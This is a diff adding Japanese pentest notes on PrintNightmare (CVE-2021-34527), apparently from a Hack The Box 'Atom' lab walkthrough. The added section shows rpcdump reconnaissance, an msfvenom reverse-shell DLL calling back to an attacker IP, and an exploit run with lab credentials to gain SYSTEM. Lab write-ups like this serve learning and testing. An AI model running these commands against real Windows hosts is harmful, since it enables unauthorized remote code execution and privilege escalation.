@@ -102,4 +102,44 @@
   rpcclient $> ^C
   ```
 
+  ## PrintNightmare(CVE-2021-34527)
+* rpcdumpでrpcでどのようなサービスが動作しているのか、調査可能
+* PrintNightmareの可能性が存在するかどうかは、MS-RPRNが動作しているかどうかを調査すればよい
+* [PrintNightmare exploit](https://github.com/cube0x0/CVE-2021-1675)
+* Windows 7 <= Windows 10 21H1 && Windows Server 2008 <= Windows Server 2019
+* 低権限のユーザアカウントを有する時、System権限を取得可能
+* Htb: Atom
+
+  ```console
+  ┌─[rio@parrot]─[~/Htb/Atom]
+  └──╼ $impacket-rpcdump @10.129.211.146 | grep -A8 MS-RPRN
+  Protocol: [MS-RPRN]: Print System Remote Protocol
+  Provider: spoolsv.exe
+  UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0
+  Bindings:
+            ncacn_ip_tcp:10.129.211.146[49668]
+            ncalrpc:[LRPC-47371fd414b47e0f02]
+  
+  Protocol: N/A
+  Provider: N/A
+  ┌─[✗]─[rio@parrot]─[~/Htb/Atom/CVE-2021-1675]
+  └──╼ $msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.10 LPORT=4444 -f dll -o shell.dll
+  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+  [-] No arch selected, selecting arch: x64 from the payload
+  No encoder specified, outputting raw payload
+  Payload size: 460 bytes
+  Final size of dll file: 8704 bytes
+  Saved as: shell.dll
+  ┌─[rio@parrot]─[~/Htb/Atom/CVE-2021-1675]
+  └──╼ $python3 CVE-2021-1675.py atom/jason:kidvscat_electron_@123@10.129.211.146 '\\10.10.16.10\public\shell.dll'
+  [*] Connecting to ncacn_np:10.129.211.146[\PIPE\spoolss]
+  [+] Bind OK
+  [+] pDriverPath Found C:\WINDOWS\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\UNIDRV.DLL
+  [*] Executing \??\UNC\10.10.16.10\public\shell.dll
+  [*] Try 1...
+  [*] Stage0: 0
+  [*] Try 2...
+  [*] Stage0: 0
+  ```
+  
   
